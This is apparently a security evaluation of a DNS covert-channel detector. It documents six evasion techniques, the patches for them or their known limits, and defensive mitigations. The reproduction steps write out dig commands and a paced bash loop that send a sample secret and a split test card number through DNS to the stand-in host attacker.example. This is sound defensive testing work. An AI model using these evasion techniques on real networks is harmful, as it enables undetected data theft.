# DNS Covert Channel Evasion & Hardening (Workstream D)

Evaluation of evasion vectors against the passive DNS covert channel detector (`detection/covert_channel/dns_detector.py`), detailing detection blind spots, bypass feasibility, applied patches, and architectural limits.



## Table of Contents

- [Evasion & Hardening Matrix](#evasion--hardening-matrix)
- [Section I: Algorithmic Vulnerabilities & Patches](#section-i-algorithmic-vulnerabilities--patches)
  * [Vector 1: Entropy Dilution (Subdomain Padding)](#vector-1-entropy-dilution-subdomain-padding)
  * [Vector 2: Multi-label Fragmentation (Label Slicing)](#vector-2-multi-label-fragmentation-label-slicing)
- [Section II: Theoretical & Mathematical Bounds](#section-ii-theoretical--mathematical-bounds)
  * [Vector 3: Micro-chunking & Shannon Upper Bound](#vector-3-micro-chunking--shannon-upper-bound)
- [Section III: Architectural Limits & Operational Trade-offs](#section-iii-architectural-limits--operational-trade-offs)
  * [Vector 4: Multi-Query Secret Splitting](#vector-4-multi-query-secret-splitting)
  * [Vector 5: Transport Layer Evasion (DNS over TCP/53)](#vector-5-transport-layer-evasion-dns-over-tcp53)
  * [Vector 6: Low-and-Slow Volumetric Beaconing](#vector-6-low-and-slow-volumetric-beaconing)



## Evasion & Hardening Matrix

| # | Evasion Vector | Targeted Rule | Category | Status & Reference | Detection Rate (Baseline $\rightarrow$ Hardened) |
|---|---|---|---|---|---|
| **1** | **Entropy Dilution (Subdomain Padding)** | `DNS_HIGH_ENTROPY` | Algorithmic Hardening | **Patched** ([PR #4](https://github.com/AntoineQ1/DLPDetection/pull/4)) | $0\% \rightarrow 100\%$ |
| **2** | **Multi-label Fragmentation (Label Slicing)** | `DNS_LONG_QNAME` | Algorithmic Hardening | *Candidate Patch* | $0\% \rightarrow 100\%$ |
| **3** | **Micro-chunking ($< 16$ chars)** | `DNS_HIGH_ENTROPY` | Mathematical Bound | *Documented Limitation* | $0\%$ (Theoretical $H_{\max}$ ceiling) |
| **4** | **Multi-Query Secret Splitting** | `DNS_SENSITIVE_DATA_*` | Architectural Limit | *Documented Limitation* | $0\%$ (Cross-packet fragmentation) |
| **5** | **Transport Evasion (DNS/TCP)** | Global BPF Filter | Architectural Limit | *Documented Limitation* | $0\%$ (L4 transport mismatch) |
| **6** | **Low-and-Slow Beaconing** | `DNS_TUNNEL_VOLUME` | Operational Trade-off | *Documented Limitation* | $0\%$ (Sliding window eviction) |



## Section I: Algorithmic Vulnerabilities & Patches

### Vector 1: Entropy Dilution (Subdomain Padding)

#### 1. Threat Model & Evasion Mechanism

Encrypted or encoded data (Base32, Hex, Base64) typically has high Shannon entropy ($H \approx 4.0\text{--}5.0\text{ bits/char}$). The `DNS_HIGH_ENTROPY` rule flags queries where the payload reaches or exceeds `DNS_ENTROPY_THRESHOLD` (default: `3.8`).

An attacker can bypass this threshold by **padding** the subdomain with predictable or repeating characters (e.g., 32 `a` characters). This pulls the average entropy across the full query below $3.8$.

#### 2. Root Cause Analysis

In the baseline version of `extract_features()` (`dns_detector.py`), entropy was computed on the joined subdomain string:

```python
subdomain = "".join(sub_labels)
...
entropy = shannon_entropy(subdomain)
```

Combining a 16-character high-entropy secret ($H \approx 4.0$) with 64 repetitive padding characters drops overall entropy to $\sim 1.5$, causing a false negative.

#### 3. Countermeasure ([PR #4](https://github.com/AntoineQ1/DLPDetection/pull/4))

The detector now combines two entropy checks:

1. **Global entropy:** Catches multi-chunk encoded streams where individual labels are short.
2. **Per-label maximum entropy:** Evaluates each label where `len(label) >= ENTROPY_MIN_CHARS` (16).

Even if repetitive labels dilute the aggregate score, any individual label containing high-entropy data will trip `DNS_HIGH_ENTROPY`.

#### 4. Reproduction Steps

Ensure the DNS sink is running on the attacker container:

```bash
docker compose exec attacker python servers/dns_sink.py
```

Send the padded query from the `victim` container:

```bash
TARGET="172.21.0.10"
APEX="attacker.example"
SECRET="k9x2m7q8w4p1z3v5"
PAD="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

docker compose exec victim dig "@${TARGET}" "${SECRET}.${PAD}.${PAD}.${APEX}" +short
```

#### 5. Results

##### Baseline (`main`)

Average entropy drops to $\approx 1.5$. `DNS_HIGH_ENTROPY` is bypassed; only query length triggers:

```text
dlp-covert-detector  | ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (15:25:21 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=k9x2m7q8w4p1z3v5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaa… │
dlp-covert-detector  | │          qtype=A   longest_label=32   qname_len=99                           │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

##### Hardened Branch (`evaluation/dns-entropy-hardening`)

The per-label check catches the 16-character secret chunk `k9x2m7q8w4p1z3v5` ($H = 4.0$), raising both alerts:

```text
dlp-covert-detector  | ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (15:26:03 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=k9x2m7q8w4p1z3v5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaa… │
dlp-covert-detector  | │          qtype=A   longest_label=32   qname_len=99                           │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
dlp-covert-detector  | ╭─ ⚠  HIGH DNS_HIGH_ENTROPY  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (15:26:03 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=k9x2m7q8w4p1z3v5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaa… │
dlp-covert-detector  | │          qtype=A   entropy=4.0   payload_len=80                              │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

### Vector 2: Multi-label Fragmentation (Label Slicing)

#### 1. Threat Model & Evasion Mechanism

`DNS_LONG_QNAME` originally checked whether a single label reached $\ge 20\text{ chars}$ or the total FQDN reached $\ge 50\text{ chars}$.

This leaves a gap for payloads between 20 and 45 characters (tokens, short keys):

- Sent as a single label (`winterforestsilverpocket.attacker.example`), it gets caught (`longest_label = 24 >= 20`).
- Sliced into smaller labels (`winter.forest.silver.pocket.attacker.example`), each label (except the apex) is $\le 6$ characters and total length is 44 characters.
- Dictionary-encoded or word-based data keeps entropy low ($H \approx 3.1\text{ bits/char} < 3.8$), bypassing the entropy check.
- Transmitting the secret in a single request bypasses volume heuristics.

Because standard English text averages roughly ~2.6 bits per character (see [source](https://cs.stanford.edu/people/eroberts/courses/soco/projects/1999-00/information-theory/entropy_of_english_9.html)), attackers can map binary data to wordlists (similar to BIP-39) to mimic legitimate hostnames while staying well under the 3.8 threshold.

#### 2. Root Cause Analysis

In `dns_detector.py`, `QnameFeatures` only inspected label and FQDN lengths, ignoring sub-label count:

```python
if feats.longest_label >= LABEL_LEN_THRESHOLD or feats.total_len >= QNAME_LEN_THRESHOLD:
    alerts.append(...)
```

#### 3. Countermeasure (`evaluation/dns-label-fragmentation`)

Enforce an upper bound on sub-label nesting depth:

- Added `SUB_LABEL_COUNT_THRESHOLD` (default: `4`, configurable via `DNS_SUB_LABEL_COUNT_THRESHOLD`).
- Extracted `sub_label_count = len(sub_labels)` in `extract_features()`.
- Added `sub_label_count >= SUB_LABEL_COUNT_THRESHOLD` as a trigger in `DNS_LONG_QNAME`.

Legitimate hostnames rarely nest $\ge 4$ sub-labels below their apex. Forcing payloads into fewer labels makes them easier to catch with `LABEL_LEN_THRESHOLD`.

#### 4. Reproduction Steps

Run from the `victim` container:

```bash
TARGET="172.21.0.10"
APEX="attacker.example"

# 1. Monolithic query (caught: longest_label = 24 >= 20)
docker compose exec victim dig "@${TARGET}" "winterforestsilverpocket.${APEX}" +short

# 2. Sliced query (evades baseline, caught by hardened patch)
docker compose exec victim dig "@${TARGET}" "winter.forest.silver.pocket.${APEX}" +short
```

#### 5. Results

##### Baseline (`main`)

The monolithic query triggers `DNS_LONG_QNAME`, while the sliced variant passes undetected:

```text
dlp-covert-detector  | ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (13:53:24 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=winterforestsilverpocket.attacker.example   qtype=A           │
dlp-covert-detector  | │          longest_label=24   qname_len=41                                     │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

##### Hardened Branch (`evaluation/dns-label-fragmentation`)

`DNS_LONG_QNAME` triggers on sub-label count:

```text
dlp-covert-detector  | ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (13:54:23 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=winter.forest.silver.pocket.attacker.example   qtype=A        │
dlp-covert-detector  | │          longest_label=8   qname_len=44   sub_label_count=4                  │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

## Section II: Theoretical & Mathematical Bounds

### Vector 3: Micro-chunking & Shannon Upper Bound

#### 1. Threat Model & Evasion Mechanism

An attacker can split encoded or encrypted data into small chunks of 8 to 12 characters per query:

```text
7b4a9f2e1c0d.attacker.example
```

Detection fails because:

1. `dns_detector.py` skips entropy calculation for strings shorter than `ENTROPY_MIN_CHARS` ($16$).
2. A 12-character string has a mathematical upper bound that prevents it from reaching $3.8\text{ bits/char}$.

#### 2. Mathematical Limit on Short Strings

Mathematically, any string shorter than 14 unique characters cannot reach an entropy score of 3.8 ($\log_2(N) < 3.8$). 

Enforcing `ENTROPY_MIN_CHARS = 16` is a necessary constraint: calculating entropy on shorter strings is statistically unreliable and yields too many false positives.

#### 3. Why Lowering Thresholds Fails

Lowering the threshold (e.g. `DNS_ENTROPY_THRESHOLD = 3.0`, `ENTROPY_MIN_CHARS = 8`) causes frequent false positives on common hostnames:

- `gateway-1` ($N=9$, $H = 2.95$)
- `api-static` ($N=10$, $H = 3.12$)
- `auth-service` ($N=12$, $H = 3.25$)

#### 4. Reproduction Steps

Send a 12-character high-entropy chunk from `victim`:

```bash
TARGET="172.21.0.10"
APEX="attacker.example"
CHUNK="7b4a9f2e1c0d"

docker compose exec victim dig "@${TARGET}" "${CHUNK}.${APEX}" +short
```

#### 5. Results

```text
dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
```

No alerts triggered:

- `DNS_LONG_QNAME`: `longest_label = 12 < 20`, `total_len = 29 < 50`, `sub_label_count = 1 < 4`.
- `DNS_HIGH_ENTROPY`: Skipped (`payload_len = 12 < 16`). Theoretical max ($3.585$) is below 3.8.
- `DNS_TUNNEL_VOLUME`: 1 request ($1 < 8$).
- `DNS_SENSITIVE_DATA_*`: No match on regex rules.

#### 6. Mitigations

Stateless per-packet entropy cannot catch micro-chunks. Alternative defenses include:

1. **Broader Volume Windows:** Track unique subdomains over longer windows (e.g. 1 hour instead of 60 seconds).
2. **Authoritative NXDOMAIN Monitoring:** High rates of generated subdomains often correlate with NXDOMAIN spikes in resolver logs.
3. **Response-side Inspection:** Check TXT, NULL, or CNAME records returned by authoritative nameservers, which typically have larger payloads.

## Section III: Architectural Limits & Operational Trade-offs

### Vector 4: Multi-Query Secret Splitting

#### 1. Threat Model & Evasion Mechanism

The detector checks for unencrypted credit card numbers (PCI-DSS / PAN via Luhn algorithm under `DNS_SENSITIVE_DATA_CC`), looking for contiguous digit sequences of 13 to 19 digits.

An attacker can split a 16-digit card number across two sequential queries:

```text
Query 1: c0.41111111.attacker.example
Query 2: c1.11111111.attacker.example
```

Each packet carries only 8 digits, avoiding the 13-digit minimum needed to run the Luhn check.

#### 2. Root Cause

`dns_detector.py` evaluates packets statelessly:

```python
def inspect(self, src_ip: str, dst_ip: str, qname: str, ...) -> list[dict]:
    feats = extract_features(qname)
    ...
```

Catching cross-packet fragmentation requires stateful stream reconstruction:

- Tracking per-client state keyed by `(source_ip, apex)`.
- Stripping custom chunk identifiers (`c0`, `c1`).
- Handling packet reordering, packet loss, and timeouts over UDP.
- Guarding state tables against memory exhaustion.

This goes beyond the scope of a lightweight passive sniffer.

#### 3. Reproduction Steps

Exfiltrate a test Visa card (`4111111111111111`) across two queries:

```bash
TARGET="172.21.0.10"
APEX="attacker.example"

# Query 1: First 8 digits
docker compose exec victim dig "@${TARGET}" "c0.41111111.${APEX}" +short

# Query 2: Remaining 8 digits
docker compose exec victim dig "@${TARGET}" "c1.11111111.${APEX}" +short
```

#### 4. Results

```text
dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
```

No alerts triggered:

- `DNS_SENSITIVE_DATA_CC`: Both chunks are 8 digits ($< 13$ minimum).
- `DNS_LONG_QNAME`: Both queries have `longest_label = 8 < 20`, `total_len = 28 < 50`, `sub_label_count = 2 < 4`.
- `DNS_HIGH_ENTROPY`: Repetitive digits produce very low entropy.
- `DNS_TUNNEL_VOLUME`: 2 queries ($< 8$ limit).

#### 5. Mitigations

- **Recursive DNS Resolvers:** Forward all client DNS through a managed resolver (Unbound, BIND) with query logging and RPZ filtering.
- **Sliding Digit Buffer:** Keep a short sliding buffer of numbers received per client IP (e.g. over 10 seconds) and run the Luhn check on the concatenated string.

### Vector 5: Transport Layer Evasion (DNS over TCP/53)

#### 1. Threat Model & Evasion Mechanism

DNS supports both UDP and TCP on port 53 (RFC 1035, RFC 7766). TCP is standard for zone transfers (AXFR) and responses exceeding UDP buffer limits (EDNS0 truncation).

An attacker can force queries over TCP:

```bash
dig +tcp @172.21.0.10 exfiltration-payload.attacker.example
```

This bypasses the sniffer completely.

#### 2. Root Cause

`sniffer.py` configures Scapy with a BPF filter:

```python
BPF_FILTER = "icmp or udp port 53"
sniff(iface=INTERFACE, filter=BPF_FILTER, prn=process_packet, store=False)
```

1. **BPF Filter:** `udp port 53` causes the kernel to discard TCP/53 packets before they reach userspace.
2. **Stream Framing (RFC 7766):** Even if `tcp port 53` were added, DNS over TCP prefixes messages with a 2-byte length header and requires TCP stream reassembly (handshake tracking, ordering). Passing raw TCP packets directly into Scapy's `DNS()` layer results in parse errors.

#### 3. Reproduction Steps

Run a standard UDP query, then repeat over TCP:

```bash
TARGET="172.21.0.10"
APEX="attacker.example"
PAYLOAD="k9x2m7q8w4p1z3v5"

# 1. UDP baseline (captured)
docker compose exec victim dig "@${TARGET}" "${PAYLOAD}.${APEX}" +short

# 2. TCP query (bypasses BPF filter)
docker compose exec victim dig +tcp "@${TARGET}" "${PAYLOAD}.${APEX}" +short
```

#### 4. Results

##### UDP Baseline

The query is captured and triggers entropy detection:

```text
dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
dlp-covert-detector  | ╭─ ⚠  HIGH DNS_HIGH_ENTROPY  ALLOWED  ────────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (16:45:10 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=k9x2m7q8w4p1z3v5.attacker.example                             │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

##### TCP Query

The client gets `connection refused` (the current sink only binds UDP), but no packets reach the sniffer:

```text
;; Connection to 172.21.0.10#53(172.21.0.10) for k9x2m7q8w4p1z3v5.attacker.example failed: connection refused.
;; no servers could be reached
```

The sniffer logs remain completely empty (0 packets captured).

#### 5. Mitigations

- **Egress Firewall Rules:** Block direct outbound UDP/53 and TCP/53 from workload subnets, forcing traffic through internal recursive resolvers.
- **Full DPI Engine:** Use an engine with native TCP reassembly (Suricata, Zeek) if inspecting raw traffic taps.

### Vector 6: Low-and-Slow Volumetric Beaconing

#### 1. Threat Model & Evasion Mechanism

The volume rule (`DNS_TUNNEL_VOLUME`) detects tunneling when unique subdomains under a single apex cross a threshold within a sliding window:

**Threshold:** 8 unique subdomains per 60 seconds.

To evade this, an attacker paces requests so earlier queries expire from the rolling window before reaching the threshold. 

With a 60-second window and an 8-query trigger, sending one query every 10 to 15 seconds ensures only 4 to 6 active entries ever reside in memory at once, exfiltrating data without raising an alert.

#### 2. Root Cause & Trade-offs

Volume tracking uses an in-memory sliding window keyed by `(source_ip, apex)`:

```python
key = (src_ip, feats.apex)
state = self._flows.get(key)
...
# Evict entries outside the window and rebuild the unique set lazily.
cutoff = now - VOLUME_WINDOW_SEC
while state.seen and state.seen[0][0] < cutoff:
    state.seen.popleft()

if feats.subdomain:
    state.seen.append((now, feats.subdomain))

state.unique = {sub for _, sub in state.seen}

if len(state.unique) < VOLUME_THRESHOLD:
    state.volume_alerted = False
    return None
```

1. **Window Eviction:** Entries older than 60 seconds are purged. Pacing queries at 10-second intervals keeps the count below 8.
2. **Memory Footprint:** Extending the window (e.g. to 24 hours) causes memory usage to scale with active client/domain pairs.
3. **False Positives:** Lowering the threshold risks flagging legitimate background traffic (cloud heartbeats, CDN queries, mail server SPF lookups).

#### 3. Reproduction Steps

Send 10 queries spaced by 10-second intervals (duration: 90s):

```bash
TARGET="172.21.0.10"
APEX="attacker.example"

for i in $(seq 1 10); do
  CHUNK=$(head -c 4 /dev/urandom | xxd -p)
  docker compose exec -T victim dig "@${TARGET}" "${CHUNK}.${APEX}" +short
  echo "[+] Query ${i}/10 sent at $(date +%H:%M:%S)"
  if [ "$i" -lt 10 ]; then sleep 10; fi
done
```

#### 4. Results

##### Fast Burst Control

Sent in rapid succession ($< 5\text{s}$), `DNS_TUNNEL_VOLUME` triggers on the 8th query:

```text
dlp-covert-detector  | ╭─ ⚠  HIGH DNS_TUNNEL_VOLUME  ALLOWED  ───────────────────────────────────────╮
dlp-covert-detector  | │    Flow  172.20.0.3 → attacker.example  (14:56:07 · DNS_COVERT)              │
dlp-covert-detector  | │ Details  qname=45a22682.attacker.example   qtype=A   unique_subdomains=8     │
dlp-covert-detector  | │          window_sec=60.0                                                     │
dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
```

##### Low-and-Slow (Paced)

With 10-second intervals, the sniffer logs individual packets but raises no volume alerts:

```text
dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
(10 packets intercepted over 90 seconds — 0 alerts)
```

At no point does the rolling 60-second window hold more than 6 queries.

#### 5. Mitigations

Short-window packet sniffers cannot catch low-and-slow channels without high false-positive rates. Practical long-term solutions include:

- **Log Analytics (SIEM):** Aggregate DNS logs over multi-hour or multi-day windows.
- **Periodicity Detection:** Analyze query interval patterns using autocorrelation to detect automated beaconing even with slight jitter.
- **Domain Reputation:** Correlate lookups with Newly Observed Domain (NOD) feeds to flag traffic toward recently registered apex domains.